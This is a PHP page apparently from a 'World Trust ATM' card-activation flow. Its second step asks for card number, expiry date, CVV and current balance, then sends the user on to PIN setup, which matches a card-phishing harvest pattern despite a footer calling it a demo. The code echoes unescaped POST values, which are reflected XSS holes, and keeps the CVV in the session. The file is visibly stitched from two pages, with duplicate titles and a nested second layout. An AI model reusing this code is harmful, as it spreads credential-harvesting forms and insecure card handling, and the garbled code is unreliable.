<?php
/**

 * ATM Card Activation - Step 2: Card Details & Security

 * World Trust ATM - Card Activation
 * Page 2: Loading & Card Display

 */

require_once 'includes/config.php';
require_once 'includes/functions.php';


// Check if step 1 data exists
if (!isset($_SESSION['activation_data'])) {
    set_flash('error', 'Please complete Step 1 first.');
    redirect('index.php');
}

// Generate CSRF token
$csrf_token = generate_csrf_token();

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Verify CSRF token
    if (!isset($_POST['csrf_token']) || !verify_csrf_token($_POST['csrf_token'])) {
        set_flash('error', 'Invalid security token. Please try again.');
        redirect('card-display.php');
    }
    
    // Validate and sanitize input
    $errors = [];
    
    $cardNumber = preg_replace('/[^0-9]/', '', $_POST['card_number'] ?? '');
    $expiryDate = sanitize_input($_POST['expiry_date'] ?? '');
    $cvv = sanitize_input($_POST['cvv'] ?? '');
    $balance = sanitize_input($_POST['balance'] ?? '');
    
    // Validation
    if (!validate_card_number($cardNumber)) {
        $errors[] = 'Please enter a valid 16-digit card number.';
    }
    
    if (empty($expiryDate) || !preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $expiryDate)) {
        $errors[] = 'Please enter expiry date in MM/YY format.';
    }
    
    if (empty($cvv) || strlen($cvv) !== 3 || !ctype_digit($cvv)) {
        $errors[] = 'CVV must be exactly 3 digits.';
    }
    
    if (empty($balance) || !is_numeric($balance) || $balance < 0) {
        $errors[] = 'Please enter a valid balance amount.';
    }
    
    if (empty($errors)) {
        // Add card data to session
        $_SESSION['activation_data']['card_number'] = $cardNumber;
        $_SESSION['activation_data']['expiry_date'] = $expiryDate;
        $_SESSION['activation_data']['cvv'] = $cvv;
        $_SESSION['activation_data']['balance'] = $balance;
        
        redirect('pin-setup.php');
    } else {
        set_flash('error', implode('<br>', $errors));
    }
}

// Get flash message
$flash = get_flash();
$activationData = $_SESSION['activation_data'];

// Check if user data exists in session
check_user_session();
check_session_timeout();

// Generate card data if not exists
if (!isset($_SESSION['card_data'])) {
    $_SESSION['card_data'] = [
        'card_number' => generate_card_number(),
        'expiry_date' => generate_expiration_date(),
        'cvv' => generate_cvv(),
        'balance' => DEFAULT_BALANCE
    ];
}

$card_data = $_SESSION['card_data'];
$user_name = get_full_name();
$card_number_masked = format_card_number_masked($card_data['card_number']);
$balance = format_currency($card_data['balance']);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Card Activation - Step 2 | <?php echo APP_NAME; ?></title>

    <title><?php echo APP_NAME; ?> - Card Activated</title>

    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">

        <div class="header">
            <h1>ATM Card Activation</h1>
            <p>Secure online activation in 3 easy steps</p>
        </div>
        
        <!-- Progress Indicator -->
        <div class="progress-indicator">
            <div class="progress-step completed">
                <span class="step-number">✓</span>
                <span class="step-label">Personal Info</span>
            </div>
            <div class="progress-step active">
                <span class="step-number">2</span>
                <span class="step-label">Card Details</span>
            </div>
            <div class="progress-step">
                <span class="step-number">3</span>
                <span class="step-label">PIN Setup</span>
            </div>
        </div>
        
        <?php if ($flash): ?>
        <div class="alert alert-<?php echo $flash['type']; ?>">
            <?php echo $flash['message']; ?>
        </div>
        <?php endif; ?>
        
        <!-- Card Preview -->
        <div class="card-preview" id="cardPreview">
            <div class="card-chip"></div>
            <div class="card-number" id="cardNumberDisplay">
                **** **** **** ****
            </div>
            <div class="card-info">
                <div class="card-holder">
                    CARD HOLDER
                    <span id="cardHolderName"><?php echo strtoupper($activationData['first_name'] . ' ' . $activationData['last_name']); ?></span>
                </div>
                <div class="card-expiry">
                    VALID THRU
                    <span id="cardExpiryDisplay">MM/YY</span>
                </div>
            </div>
        </div>
        
        <form id="cardForm" method="POST" action="card-display.php">
            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
            
            <h3 style="margin-bottom: 20px; color: var(--primary-color);">Card Information</h3>
            
            <div class="form-group">
                <label for="card_number">Card Number <span class="required">*</span></label>
                <input type="text" id="card_number" name="card_number" class="form-control" 
                       autocomplete="cc-number" required maxlength="19"
                       placeholder="1234 5678 9012 3456"
                       value="<?php echo $_POST['card_number'] ?? ''; ?>">
                <span class="info-text">Enter the 16-digit number on your card</span>
                <span class="error-message">Please enter a valid card number</span>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="expiry_date">Expiry Date <span class="required">*</span></label>
                    <input type="text" id="expiry_date" name="expiry_date" class="form-control" 
                           autocomplete="cc-exp" required maxlength="5"
                           placeholder="MM/YY"
                           value="<?php echo $_POST['expiry_date'] ?? ''; ?>">
                    <span class="error-message">Format: MM/YY</span>
                </div>
                
                <div class="form-group">
                    <label for="cvv">CVV <span class="required">*</span></label>
                    <input type="text" id="cvv" name="cvv" class="form-control" 
                           autocomplete="cc-csc" required maxlength="3"
                           placeholder="123"
                           value="<?php echo $_POST['cvv'] ?? ''; ?>">
                    <span class="info-text">3 digits on back</span>
                    <span class="error-message">CVV must be 3 digits</span>
                </div>
            </div>
            
            <div class="form-group">
                <label for="balance">Current Balance <span class="required">*</span></label>
                <input type="number" id="balance" name="balance" class="form-control" 
                       autocomplete="off" required step="0.01" min="0"
                       placeholder="0.00"
                       value="<?php echo $_POST['balance'] ?? ''; ?>">
                <span class="info-text">Enter your current account balance</span>
                <span class="error-message">Please enter a valid balance</span>
            </div>
            
            <div class="button-group">
                <a href="index.php" class="btn btn-secondary">← Back</a>
                <button type="submit" class="btn btn-primary">
                    Continue to PIN Setup →
                </button>
            </div>
        </form>
    </div>
    
    <!-- Loading Spinner -->
    <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>

        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Loading Container (will be hidden after loading) -->
        <div class="loading-container" id="loadingContainer">
            <div class="loading-spinner"></div>
            <p class="loading-text">Activating your card...</p>
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <p class="progress-text"><span id="progressPercent">0</span>% Complete</p>
        </div>

        <!-- Card Display Container (will be shown after loading) -->
        <div class="card-display-container" id="cardContainer" style="display: none;">
            <div class="success-icon">✓</div>
            <h2 class="success-message">Your Card Has Been Activated!</h2>
            
            <!-- ATM Card -->
            <div class="atm-card">
                <div class="card-logo">VISA</div>
                <div class="card-chip"></div>
                <div class="card-number"><?php echo $card_number_masked; ?></div>
                <div class="card-details">
                    <div class="card-holder">
                        <div class="card-label">Card Holder</div>
                        <div class="card-value"><?php echo strtoupper($user_name); ?></div>
                    </div>
                    <div class="card-expiry">
                        <div class="card-label">Expires</div>
                        <div class="card-value"><?php echo $card_data['expiry_date']; ?></div>
                    </div>
                </div>
            </div>
            
            <!-- Balance Display -->
            <div class="balance-display">
                <div class="balance-label">Available Balance</div>
                <div class="balance-amount"><?php echo $balance; ?></div>
            </div>
            
            <p style="margin-bottom: 20px; color: var(--text-light);">
                Your card is ready to use! Please proceed to set up your PIN for enhanced security.
            </p>
            
            <a href="pin-setup.php" style="text-decoration: none;">
                <button class="btn btn-primary">Continue to PIN Setup</button>
            </a>
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
        </div>

    </div>
    
    <script src="js/card-display.js"></script>
</body>
</html>
